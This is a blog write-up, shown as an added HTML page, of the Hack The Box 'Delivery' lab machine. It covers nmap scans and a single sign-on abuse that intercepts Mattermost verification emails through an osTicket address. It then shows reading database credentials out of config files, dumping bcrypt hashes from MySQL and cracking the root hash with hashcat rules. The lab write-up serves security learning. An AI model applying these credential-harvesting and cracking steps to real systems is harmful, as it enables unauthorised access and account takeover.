@@ -1,0 +1,609 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Delivery [Easy] - Linux :: 5ysk3y Pwnz</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Delivery is an easy Linux machine that uses a some unique/uncommon concepts to root. It starts by having us abuse a single sign-on implementation between 2 web portals and this allows us to gain access to an internal chat group containing some sensitive information. We use that to get a shell before we eventually locate a password hash with a small twist. Let&amp;rsquo;s take a look at how I did this." />
+<meta name="keywords" content="HTB, Hack the Box" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://5ysk3y.github.io/htb/guides/delivery/" />
+
+
+
+
+<link rel="stylesheet" href="https://5ysk3y.github.io/assets/style.css">
+
+  <link rel="stylesheet" href="https://5ysk3y.github.io/assets/blue.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon" href="https://5ysk3y.github.io/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="https://5ysk3y.github.io/img/favicon/blue.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Delivery [Easy] - Linux">
+<meta property="og:description" content="Delivery is an easy Linux machine that uses a some unique/uncommon concepts to root. It starts by having us abuse a single sign-on implementation between 2 web portals and this allows us to gain access to an internal chat group containing some sensitive information. We use that to get a shell before we eventually locate a password hash with a small twist. Let&amp;rsquo;s take a look at how I did this." />
+<meta property="og:url" content="https://5ysk3y.github.io/htb/guides/delivery/" />
+<meta property="og:site_name" content="5ysk3y Pwnz" />
+
+  
+    <meta property="og:image" content="https://5ysk3y.github.io/img/favicon/blue.png">
+  
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2021-05-22 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="blue">
+
+
+<div class="container headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    5ysk3y pwnZ
+  </div>
+</a>
+
+    </div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/">Home</a></li>
+        
+      
+        
+          <li><a href="/blog">Blog</a></li>
+        
+      
+        
+          <li><a href="/htb">HTB</a></li>
+        
+      
+        
+          <li><a href="/thm">THM</a></li>
+        
+      
+        
+          <li><a href="https://gist.github.com/5ysk3y">Gists</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/">Home</a></li>
+      
+    
+      
+        <li><a href="/blog">Blog</a></li>
+      
+    
+      
+        <li><a href="/htb">HTB</a></li>
+      
+    
+      
+        <li><a href="/thm">THM</a></li>
+      
+    
+      
+        <li><a href="https://gist.github.com/5ysk3y">Gists</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+
+
+<a name="top"></a>
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://5ysk3y.github.io/htb/guides/delivery/">Delivery [Easy] - Linux</a></h1>
+    <div class="post-title">
+      
+
+
+<div id="breadcrumbs">
+    <a href="/">Home</a>
+     
+    
+      
+        » <a href="https://5ysk3y.github.io/htb">HTB</a>
+        
+        
+    
+    
+      
+        » <a href="https://5ysk3y.github.io/htb/guides">guides</a>
+        
+        
+    
+    
+      
+        » <a href="https://5ysk3y.github.io/htb/guides/delivery">delivery</a>
+        
+        
+    
+    
+      
+    
+</div>
+
+    </div>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2021-05-22 
+        <span style="position:relative;float:right">Read time: 10 minutes.</style>
+      </span>
+    
+    
+  </div>
+  <hr>
+  
+  <span class="post-tags">
+    <p></p>
+    
+    #<a href="https://5ysk3y.github.io/tags/hack-the-box/">Hack The Box</a>&nbsp;
+    
+    #<a href="https://5ysk3y.github.io/tags/linux/">Linux</a>&nbsp;
+    
+    #<a href="https://5ysk3y.github.io/tags/easy/">Easy</a>&nbsp;
+    
+    #<a href="https://5ysk3y.github.io/tags/single-sign-on/">Single Sign-On</a>&nbsp;
+    
+    #<a href="https://5ysk3y.github.io/tags/hashcat-rules/">Hashcat Rules</a>&nbsp;
+    
+  </span>
+  
+  
+
+  
+  <hr>
+  <aside>
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#overview">Overview</a></li>
+    <li><a href="#nmap-scan">NMAP Scan</a></li>
+    <li><a href="#user-pwn">User Pwn</a>
+      <ul>
+        <li>
+          <ul>
+            <li></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#root-pwn">Root Pwn</a></li>
+    <li><a href="#credential-store">Credential Store</a></li>
+    <li><a href="#final-thoughts">Final Thoughts</a></li>
+  </ul>
+</nav>
+  </aside>
+  <hr>
+  <div class="post-content"><div>
+        
+  <figure class="left" >
+    <img src="/images/guides/htb/delivery.png"   />
+    
+  </figure>
+
+
+<h1 id="overview">Overview<a href="#overview" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Delivery is an easy Linux machine that uses a some unique/uncommon concepts to root. It starts by having us abuse a single sign-on implementation between 2 web portals and this allows us to gain access to an internal chat group containing some sensitive information. We use that to get a shell before we eventually locate a password hash with a small twist. Let&rsquo;s take a look at how I did this.</p>
+<hr>
+<h1 id="nmap-scan">NMAP Scan<a href="#nmap-scan" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p><strong>Initial (top 1000) scan</strong>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Nmap 7.91 scan initiated Mon Mar 15 12:24:00 2021 as: nmap -sC -sV -oA nmap/initial -vvv delivery.htb</span>
+Nmap scan report <span style="color:#66d9ef">for</span> delivery.htb <span style="color:#f92672">(</span>10.10.10.222<span style="color:#f92672">)</span>
+Host is up, received reset ttl <span style="color:#ae81ff">63</span> <span style="color:#f92672">(</span>0.023s latency<span style="color:#f92672">)</span>.
+rDNS record <span style="color:#66d9ef">for</span> 10.10.10.222: delivery
+Scanned at 2021-03-15 12:24:00 GMT <span style="color:#66d9ef">for</span> 9s
+Not shown: <span style="color:#ae81ff">998</span> closed ports
+Reason: <span style="color:#ae81ff">998</span> resets
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl <span style="color:#ae81ff">63</span> OpenSSH 7.9p1 Debian 10+deb10u2 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey:
+|   <span style="color:#ae81ff">2048</span> 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCq549E025Q9FR27LDR6WZRQ52ikKjKUQLmE9ndEKjB0i1qOoL+WzkvqTdqEU6fFW6AqUIdSEd7GMNSMOk66otFgSoerK6MmH5IZjy4JqMoNVPDdWfmEiagBlG3H7IZ7yAO8gcg0RRrIQjE7XTMV09GmxEUtjojoLoqudUvbUi8COHCO6baVmyjZRlXRCQ6qTKIxRZbUAo0GOY8bYmf9sMLf70w6u/xbE2EYDFH+w60ES2K906x7lyfEPe73NfAIEhHNL8DBAUfQWzQjVjYNOLqGp/WdlKA1RLAOklpIdJQ9iehsH0q6nqjeTUv47mIHUiqaM+vlkCEAN3AAQH5mB/1
+|   <span style="color:#ae81ff">256</span> 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAiAKnk2lw0GxzzqMXNsPQ1bTk35WwxCa3ED5H34T1yYMiXnRlfssJwso60D34/IM8vYXH0rznR9tHvjdN7R3hY<span style="color:#f92672">=</span>
+|   <span style="color:#ae81ff">256</span> b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEV5D6eYjySqfhW4l4IF1SZkZHxIRihnY6Mn6D8mLEW7
+80/tcp open  http    syn-ack ttl <span style="color:#ae81ff">63</span> nginx 1.14.2
+| http-methods:
+|_  Supported Methods: GET HEAD
+|_http-server-header: nginx/1.14.2
+|_http-title: Welcome
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<span style="color:#75715e"># Nmap done at Mon Mar 15 12:24:09 2021 -- 1 IP address (1 host up) scanned in 9.25 seconds</span>
+</code></pre></div><p><strong>Full scan</strong>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Nmap 7.91 scan initiated Mon Mar 15 12:33:07 2021 as: nmap -p- -oA nmap/full_port -vvv delivery.htb</span>
+Nmap scan report <span style="color:#66d9ef">for</span> delivery.htb <span style="color:#f92672">(</span>10.10.10.222<span style="color:#f92672">)</span>
+Host is up, received echo-reply ttl <span style="color:#ae81ff">63</span> <span style="color:#f92672">(</span>0.022s latency<span style="color:#f92672">)</span>.
+rDNS record <span style="color:#66d9ef">for</span> 10.10.10.222: delivery
+Scanned at 2021-03-15 12:33:07 GMT <span style="color:#66d9ef">for</span> 31s
+Not shown: <span style="color:#ae81ff">65532</span> closed ports
+Reason: <span style="color:#ae81ff">65532</span> resets
+PORT     STATE SERVICE REASON
+22/tcp   open  ssh     syn-ack ttl <span style="color:#ae81ff">63</span>
+80/tcp   open  http    syn-ack ttl <span style="color:#ae81ff">63</span>
+8065/tcp open  unknown syn-ack ttl <span style="color:#ae81ff">63</span>
+
+Read data files from: /usr/bin/../share/nmap
+<span style="color:#75715e"># Nmap done at Mon Mar 15 12:33:38 2021 -- 1 IP address (1 host up) scanned in 30.93 seconds</span>
+</code></pre></div><p>The higher <code>8065</code> port is actually another web port.</p>
+<hr>
+<h1 id="user-pwn">User Pwn<a href="#user-pwn" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Let&rsquo;s begin by outlining the different websites that are available here along with a brief description for each:</p>
+<ul>
+<li><a href="http://delivery.htb">http://delivery.htb</a> = Loads a static HTML website that has links to the following:</li>
+<li><a href="http://helpdesk.delivery.htb">http://helpdesk.delivery.htb</a> = osTicket (no version yet)</li>
+<li><a href="http://delivery.htb:8065">http://delivery.htb:8065</a> = MatterMost (All team communication in one place, searchable and accessible anywhere)</li>
+</ul>
+<p>Now these can be looked into with more intent.</p>
+<hr>
+<h5 id="websites">Websites<a href="#websites" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h5>
+<ul>
+<li><strong><a href="http://delivery.htb">http://delivery.htb</a></strong></li>
+</ul>
+<p>For the most part this is a static page with no interative elements that actually directs people to a helpdesk website. There is a button labelled &ldquo;Contact Us&rdquo; which also gives us some useful information:</p>
+
+  <figure class="left" >
+    <img src="/images/guides/htb/delivery/20210323125700.png"  alt="A contact us form"   />
+    
+  </figure>
+
+
+<p>The MatterMost web server is on a higher port (8065)</p>
+<hr>
+<ul>
+<li><strong><a href="http://helpdesk.delivery.htb">http://helpdesk.delivery.htb</a></strong></li>
+</ul>
+<p>On the helpdesk, it is possible to register for an account by virtue of submitting a new ticket. The above image seems to suggest we should register with a @delivery.htb e-mail,
+and doing so creates a new ticket along with a message akin to the following message:</p>
+<pre><code>You may check the status of your ticket, by navigating to the Check Status page using ticket id: 6066582.
+
+If you want to add more information to your ticket, just email 6066582@delivery.htb
+</code></pre><p>If we then look to check the ticket using our chosen @delivery.htb email address and the generated ticket number, we get access to said ticket:</p>
+
+  <figure class="left" >
+    <img src="/images/guides/htb/delivery/20210328221641.png"  alt="A contact us form"   />
+    
+  </figure>
+
+
+<p>The interesting thing here is that, if you pay attention to the information given when we create our ticket, it specifically says that you can update the ticket directly by emailing a special address, in this case: <a href="mailto:6066582@delivery.htb">6066582@delivery.htb</a></p>
+<p>This leads us onto Mattermost:</p>
+<hr>
+<ul>
+<li><strong><a href="http://delivery.htb:8065/">http://delivery.htb:8065/</a></strong></li>
+</ul>
+<p>Registering on here, using just random information, shows that it requires email verification before you can proceed.</p>
+<p>Using an actual burner email demonstrates that we dont actually get anything from the server, which makes sense since HTB machines have very limited internet access (e.g. nothing outside of GitHub), however we can leverage our helpdesk ticket address in hope that it can intercept any verification e-mails on the ticket itself. First, register on Mattermost with the following information, relevant to the helpdesk ticket generated earlier. In my case:</p>
+<ul>
+<li>E-mail: <a href="mailto:6066582@delivery.htb">6066582@delivery.htb</a></li>
+<li>User: syskey</li>
+<li>Pass: Password123!</li>
+</ul>
+<p>And then refresh the ticket in OSTicket to get the contents of the verification e-mail:</p>
+
+  <figure class="left" >
+    <img src="/images/guides/htb/delivery/20210328221453.png"  alt="A contact us form"   />
+    
+  </figure>
+
+
+<p>If you follow the URL that&rsquo;s provided it will allow verification and a login to Mattermost can then be achieved.</p>
+<p>Once logged in, the first thing shown is a team selection screen:</p>
+
+  <figure class="left" >
+    <img src="/images/guides/htb/delivery/20210328222236.png"  alt="A contact us form"   />
+    
+  </figure>
+
+
+<p>Joining the Internal team, as it&rsquo;d be rude not to and it&rsquo;s the only option, there&rsquo;s get some interesting information along with a set of creds:</p>
+
+  <figure class="left" >
+    <img src="/images/guides/htb/delivery/20210328222439.png"  alt="A contact us form"   />
+    
+  </figure>
+
+
+<p>Attempting to use these credentials via SSH gives us a user shell and the user.txt - from here, we TargetRoot.</p>
+<hr>
+<h1 id="root-pwn">Root Pwn<a href="#root-pwn" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>As shell access was gained access via exploitation of communication between two web portals, the first thing to check would be Mattermost/OSTicket website files for potential database information. Inside of <code>/var/www</code> there are files for the root webpage for delivery.htb as well as the OSTicket instance:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">maildeliverer@Delivery:/var/www$ ls -la
+total <span style="color:#ae81ff">16</span>
+drwxr-xr-x  <span style="color:#ae81ff">4</span> root     root     <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">26</span> 09:09 .
+drwxr-xr-x <span style="color:#ae81ff">12</span> root     root     <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">26</span> 09:08 ..
+drwxr-xr-x  <span style="color:#ae81ff">5</span> root     root     <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">28</span> 06:52 html
+drwxr-xr-x  <span style="color:#ae81ff">4</span> www-data www-data <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">26</span> 09:10 osticket
+</code></pre></div><p>Starting with digging for DB information with OSTicket:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">maildeliverer@Delivery:/var/www/osticket$ grep -ril mysql .
+./upload/include/i18n/en_US/help/tips/install.yaml
+./upload/include/ost-sampleconfig.php
+./upload/include/class.search.php
+./upload/include/cli/modules/import.php
+./upload/include/staff/system.inc.php
+./upload/include/ost-config.php
+./upload/include/class.upgrader.php
+./upload/include/class.setup.php
+./upload/include/class.file.php
+./upload/include/class.dynamic_forms.php
+./upload/include/.MANIFEST
+./upload/include/class.orm.php
+./upload/include/class.misc.php
+./upload/include/upgrader/prereq.inc.php
+./upload/include/upgrader/streams/core/9143a511-0d6099a6.patch.sql
+./upload/include/upgrader/streams/core/8f99b8bf-03ff59bf.task.php
+./upload/include/upgrader/streams/core/f5692e24-4323a6a8.patch.sql
+./upload/include/upgrader/streams/core/8b923d61-9b5550da.patch.sql
+./upload/include/mysqli.php
+./upload/include/class.timezone.php
+./upload/bootstrap.php
+</code></pre></div><p>The standout file here is <code>./upload/include/ost-config.php</code> - namely down to the filename, but also because there is a sample variant in this list, which indicates that this may well be an updated copy that&rsquo;s being used by OSTicket. Looking at the file itself shows there are indeed some MySQL Creds:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e"># Mysql Login info
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#39;DBTYPE&#39;</span>,<span style="color:#e6db74">&#39;mysql&#39;</span>);
+<span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#39;DBHOST&#39;</span>,<span style="color:#e6db74">&#39;localhost&#39;</span>);
+<span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#39;DBNAME&#39;</span>,<span style="color:#e6db74">&#39;osticket&#39;</span>);
+<span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#39;DBUSER&#39;</span>,<span style="color:#e6db74">&#39;ost_user&#39;</span>);
+<span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#39;DBPASS&#39;</span>,<span style="color:#e6db74">&#39;!H3lpD3sk123!&#39;</span>);
+</code></pre></div><p>Logging into the MySQL service with that means that digging can continue:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">MariaDB [(<span style="color:#66d9ef">none</span>)]<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">show</span> databases;
+<span style="color:#f92672">+</span><span style="color:#75715e">--------------------+
+</span><span style="color:#75715e"></span><span style="color:#f92672">|</span> <span style="color:#66d9ef">Database</span>           <span style="color:#f92672">|</span>
+<span style="color:#f92672">+</span><span style="color:#75715e">--------------------+
+</span><span style="color:#75715e"></span><span style="color:#f92672">|</span> information_schema <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span> osticket           <span style="color:#f92672">|</span>
+<span style="color:#f92672">+</span><span style="color:#75715e">--------------------+
+</span><span style="color:#75715e"></span>
+<span style="color:#ae81ff">2</span> <span style="color:#66d9ef">rows</span> <span style="color:#66d9ef">in</span> <span style="color:#66d9ef">set</span> (<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">000</span> sec)
+
+MariaDB [(<span style="color:#66d9ef">none</span>)]<span style="color:#f92672">&gt;</span> use osticket;
+<span style="color:#66d9ef">Database</span> changed
+
+MariaDB [osticket]<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">show</span> tables <span style="color:#66d9ef">where</span> Tables_in_osticket <span style="color:#66d9ef">LIKE</span> <span style="color:#e6db74">&#34;%user%&#34;</span>;
+<span style="color:#f92672">+</span><span style="color:#75715e">--------------------+
+</span><span style="color:#75715e"></span><span style="color:#f92672">|</span> Tables_in_osticket <span style="color:#f92672">|</span>
+<span style="color:#f92672">+</span><span style="color:#75715e">--------------------+
+</span><span style="color:#75715e"></span><span style="color:#f92672">|</span> ost_user           <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span> ost_user__cdata    <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span> ost_user_account   <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span> ost_user_email     <span style="color:#f92672">|</span>
+<span style="color:#f92672">+</span><span style="color:#75715e">--------------------+
+</span></code></pre></div><p>Looking at each of these user tables, there don&rsquo;t appear to be any useful hashes, which sucks, so the next step is to look at Mattermost to see if that has an associated DB:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">maildeliverer@Delivery:~$ find / -type d -name mattermost 2&gt;/dev/null
+/opt/mattermost
+/var/lib/mysql/mattermost
+</code></pre></div><p>There <em>is</em> a folder for Mattermost within MySQL&rsquo;s directory structutre, which is a good sign. The file system contents are also somewhat interesting:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">maildeliverer@Delivery:/opt/mattermost$ ls -la
+total <span style="color:#ae81ff">288</span>
+drwxrwxr-x <span style="color:#ae81ff">12</span> mattermost mattermost   <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">26</span> 09:24 .
+drwxr-xr-x  <span style="color:#ae81ff">3</span> root       root         <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">26</span> 09:22 ..
+drwxrwxr-x  <span style="color:#ae81ff">2</span> mattermost mattermost   <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">18</span> 08:53 bin
+drwxrwxr-x  <span style="color:#ae81ff">7</span> mattermost mattermost   <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">26</span> 09:24 client
+drwxrwxr-x  <span style="color:#ae81ff">2</span> mattermost mattermost   <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">26</span> 09:23 config
+drwxrwxr-x  <span style="color:#ae81ff">3</span> mattermost mattermost   <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">28</span> 17:15 data
+-rw-rw-r--  <span style="color:#ae81ff">1</span> mattermost mattermost   <span style="color:#ae81ff">2052</span> Dec <span style="color:#ae81ff">18</span> 08:52 ENTERPRISE-EDITION-LICENSE.txt
+drwxrwxr-x  <span style="color:#ae81ff">2</span> mattermost mattermost   <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">18</span> 08:52 fonts
+drwxrwxr-x  <span style="color:#ae81ff">2</span> mattermost mattermost   <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">18</span> 08:52 i18n
+drwxrwxr-x  <span style="color:#ae81ff">2</span> mattermost mattermost   <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">26</span> 09:23 logs
+-rw-rw-r--  <span style="color:#ae81ff">1</span> mattermost mattermost    <span style="color:#ae81ff">898</span> Dec <span style="color:#ae81ff">18</span> 08:52 manifest.txt
+-rw-rw-r--  <span style="color:#ae81ff">1</span> mattermost mattermost <span style="color:#ae81ff">229264</span> Dec <span style="color:#ae81ff">18</span> 08:52 NOTICE.txt
+drwxr--r--  <span style="color:#ae81ff">5</span> mattermost mattermost   <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">28</span> 17:15 plugins
+drwxrwxr-x  <span style="color:#ae81ff">2</span> mattermost mattermost   <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">18</span> 08:53 prepackaged_plugins
+-rw-rw-r--  <span style="color:#ae81ff">1</span> mattermost mattermost   <span style="color:#ae81ff">6262</span> Dec <span style="color:#ae81ff">18</span> 08:52 README.md
+drwxrwxr-x  <span style="color:#ae81ff">2</span> mattermost mattermost   <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">18</span> 08:52 templates
+</code></pre></div><p>Inside of the <code>config</code> directory we have a <code>config.json</code> file which does contain some more MySQL credentials, albeit not in the usual PHP format:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">maildeliverer@Delivery:/opt/mattermost/config$ grep -A3 mysql config.json
+        <span style="color:#e6db74">&#34;DriverName&#34;</span>: <span style="color:#e6db74">&#34;mysql&#34;</span>,
+        <span style="color:#e6db74">&#34;DataSource&#34;</span>: <span style="color:#e6db74">&#34;mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s&#34;</span>,
+        <span style="color:#e6db74">&#34;DataSourceReplicas&#34;</span>: <span style="color:#f92672">[]</span>,
+        <span style="color:#e6db74">&#34;DataSourceSearchReplicas&#34;</span>: <span style="color:#f92672">[]</span>,
+</code></pre></div><p>Logging into MySQL once more with the credentials shown above, we can get a list of Username/Passwords from its <code>Users</code> table:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">maildeliverer@Delivery:/opt/mattermost/config$ mysql -u mmuser -p -e <span style="color:#e6db74">&#34;select Username,Password from mattermost.Users;&#34;</span>
+Enter password:
++----------------------------------+--------------------------------------------------------------+
+| Username                         | Password                                                     |
++----------------------------------+--------------------------------------------------------------+
+| syskey                           | $2a$10$qE1UXoCgvfrKIVqee1BGM.2a3qPxffsYVJ3aMg6g6N11QdrWokaCu |
+| surveybot                        |                                                              |
+| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |
+| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |
+| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |
+| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |
+| channelexport                    |                                                              |
+| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |
++----------------------------------+--------------------------------------------------------------+
+</code></pre></div><p>These are, of course, hashed password values but ones that can potentially be cracked. Most users can be ommited as they seemingly have no associated password, as can the account for syskey as I created that.</p>
+<p><strong>N.B</strong> - Ask my team mates about me cracking hashes for passwords I&rsquo;ve created&hellip;</p>
+<p>The main hash that stands out here is the &ldquo;root&rdquo; hash so that&rsquo;ll be the one to focus on for now.</p>
+<p>All that said, before proceeding with Hashcat, one other consideration here comes from the Mattermost internal server we discovered earlier. As well as login information, there was also this:</p>
+<pre><code>root - 2:30 PM - Also please create a program to help us stop re-using the same passwords everywhere.... Especially those that are a variant of &quot;PleaseSubscribe!&quot;
+
+root - 3:58 PM - PleaseSubscribe! may not be in RockYou but if any hacker manages to get our hashes, they can use hashcat rules to easily crack all variations of common words or phrases.
+</code></pre><p>Historically, ippsec has mentioned (as part of prior videos) Hashcat rules - namely the likes of <code>best64</code>. These are rule sets that modify wordlists in interesting ways, to form new combinations without much manual work. In Kali these rulesets are already supplied, but in Parrot the rule files may be found here:</p>
+<p><code>/usr/share/doc/hashcat/rules</code></p>
+<p>With that and the following in a file that hashcat would target:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat delivery.htb
+root:$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO
+</code></pre></div><p>As well as the password variant in a file named &lsquo;password&rsquo;:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat password
+PleaseSubscribe!
+</code></pre></div><p>We can look to begin our cracking. One thing to note is that this particular hash is in bcrypt format which is notoriously bitchy to crack:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ hashcat --example-hashes | grep bcrypt -A1 -B1
+MODE: <span style="color:#ae81ff">3200</span>
+TYPE: bcrypt $2*$, Blowfish <span style="color:#f92672">(</span>Unix<span style="color:#f92672">)</span>
+HASH: $2a$05$MBCzKhG1KhezLh.0LRa0Kuw12nLJtpHy6DIaU.JAnqJUDYspHC.Ou
+</code></pre></div><p>Meaning our full command will be this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ hashcat -m <span style="color:#ae81ff">3200</span> delivery.htb password -r /usr/share/hashcat/rules/best64.rule --user
+</code></pre></div><p><strong>N.B</strong> - Hashcat&rsquo;s <code>--user</code> flag just ensures that we don&rsquo;t get a token length exception as a result of us having the username in the hash file.</p>
+<p>After a fairly short time we get a result:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ hashcat -m <span style="color:#ae81ff">3200</span> delivery.htb passwords -r /usr/share/hashcat/rules/best64.rule --user --show
+root:$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21
+</code></pre></div><p>Attempting to SSH directly to root using this password doesn&rsquo;t let us connect, however using <code>su</code> via the deliverer user does permit that access:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">maildeliverer@Delivery:/opt/mattermost/config$ su -
+Password:
+root@Delivery:~# ls -la
+total <span style="color:#ae81ff">44</span>
+drwx------  <span style="color:#ae81ff">5</span> root root <span style="color:#ae81ff">4096</span> Jan  <span style="color:#ae81ff">5</span> 06:39 .
